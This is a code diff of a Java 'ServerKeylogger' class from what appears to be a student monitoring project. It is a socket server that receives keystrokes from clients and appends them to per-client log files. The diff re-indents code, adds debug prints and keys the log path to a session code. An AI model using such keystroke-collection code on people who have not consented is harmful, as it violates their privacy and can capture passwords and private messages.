@@ -16,10 +16,10 @@ public class ServerKeylogger implements Runnable {
     //private static final String LOG_DIRECTORY = "D:\\PBL4\\LiveOwlServer\\src\\main\\java\\com\\server\\liveowl\\Keylogger\\";
     private static final int MAX_THREADS = 25;
     private final ExecutorService threadPool = Executors.newFixedThreadPool(MAX_THREADS);
-public ServerKeylogger(ProcessGetData processGetData) {
-    this.processGetData = processGetData;
-}
-public void run() {
+    public ServerKeylogger(ProcessGetData processGetData) {
+        this.processGetData = processGetData;
+    }
+    public void run() {
         try (ServerSocket serverSocket = new ServerSocket(PORT)) {
             System.out.println("ServerKeylogger đang lắng nghe ở cổng " + PORT);
             while (processGetData.isRunning()) {
@@ -42,17 +42,19 @@ public void run() {
 
     private void handleClient(Socket socket) {
         String clientID = "";
+        String code = "";
         try (InputStream inputStream = socket.getInputStream();
              BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream))) {
-            // Đọc ID của client
             clientID = reader.readLine();
+            System.out.println("Client ID: " + clientID);
+            System.out.println("Code : " + code);
             if (clientID == null) {
                 System.out.println("Không nhận được ID client.");
                 return;
             }
-            String logFilePath = keyboardPath + "/_94e653ee/keyboard_" + clientID + ".txt";
-            // Ghi dữ liệu vào file
-            try (FileWriter writer = new FileWriter(logFilePath, true)) { // Mở file ở chế độ "append"
+            String logFilePath = keyboardPath + "/_" + processGetData.getCode() + "/keyboard_" + clientID + ".txt";
+            System.out.println("đường dẫn lưu file " + logFilePath);
+            try (FileWriter writer = new FileWriter(logFilePath, true)) {
                 String keyStroke;
                 while ((keyStroke = reader.readLine()) != null) {
                     writer.write(keyStroke);
